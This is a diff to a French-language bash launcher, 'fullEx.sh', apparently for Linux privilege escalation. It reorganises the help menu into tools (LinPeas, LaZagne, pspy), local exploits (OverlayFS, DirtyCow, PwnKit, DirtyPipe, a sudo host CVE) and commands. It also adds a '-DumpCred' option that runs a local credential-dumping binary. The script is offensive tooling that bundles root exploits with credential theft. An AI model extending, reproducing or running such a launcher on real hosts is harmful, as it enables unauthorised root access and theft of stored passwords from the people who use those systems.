@@ -16,24 +16,30 @@ $$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\
 EOF
 
 if [[ "$*" == "-help" ]]; then
-    ascii
-    echo " "
-    echo " "
-    echo "Usage: ./fullEx.sh COMMAND"
-    echo " "
-    echo "Commands:"
-    echo "   -LinPeas       Execute LinPeas"
-    echo "   -LaZagne       Execute LaZagne"
-    echo "   -Pspy64/32     Execute pspy64/32"
-    echo "   -Overlays      Compilation + execution binaire - CVE-2015-1328"
-    echo "   -DirtyCow      Compilation + execution binaire - CVE-2016-5195"
-    echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
-    echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
-    echo "   -Host          Sudo Host - CVE-2025-32462"
-    echo "   -check         Verifie si gcc est installer"
-    echo "   -perm          Applique les droit d'execution sur '/fullEx'"
-    echo " "
-    exit 0
+     ascii
+     echo " "
+     echo " "
+     echo "Usage: ./fullEx.sh COMMAND"
+     echo " "
+     echo "Outils:"
+     echo "   -LinPeas       Execute LinPeas"
+     echo "   -LaZagne       Execute LaZagne"
+     echo "   -Pspy64/32     Execute pspy64/32"
+     echo "   -DumpCred      Dump les creds"
+     echo " "
+     echo "Exploits:"
+     echo "   -Overlays      Compilation + execution binaire - CVE-2021-3493"
+     echo "   -DirtyCow      Compilation + execution binaire - CVE-2016-5195"
+     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
+     echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
+     echo "   -Host          Sudo Host - CVE-2025-32462"
+     echo " "
+     echo "Cmds:"
+     echo "   -check         Verifie si gcc est installer"
+     echo "   -perm          Applique les droit d'execution sur '/fullEx'"
+     echo "   -help          Affiche les commandes"
+     echo " "
+     exit 0
 fi
 
 # Applique les droit d'execution sur le l'ensemble du dossier fullEx
@@ -68,6 +74,11 @@ for arch in 64 32; do
           "${PWD}/pspy/pspy${arch}"
      fi
 done
+
+# DumpCred
+if [[ "$*" == "-DumpCred" ]]; then 
+     ${PWD}/outils/Dumpcred/dumpcreds -D
+fi
 
 ## Exploit ##
 
